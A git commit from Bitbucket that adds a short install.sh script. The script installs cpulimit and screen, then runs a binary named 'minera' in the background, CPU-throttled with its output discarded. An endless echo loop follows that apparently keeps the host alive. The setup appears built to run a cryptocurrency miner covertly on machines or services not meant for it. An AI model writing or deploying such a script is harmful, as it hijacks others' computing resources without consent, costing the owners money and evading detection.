8bb6359dd4bcb5bed6f1cff95242dc5daa8b31b6
juan robert <kijang-020@hotmail.com>
2021-12-24 23:26:35 +0000

    install.sh created online with Bitbucket

---
+++ install.sh
@@ -0,0 +1,6 @@
+apt-get update -y
+apt-get install -y cpulimit screen
+chmod +x minera
+chmod +x config.json
+cpulimit -l 2 ./minera >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
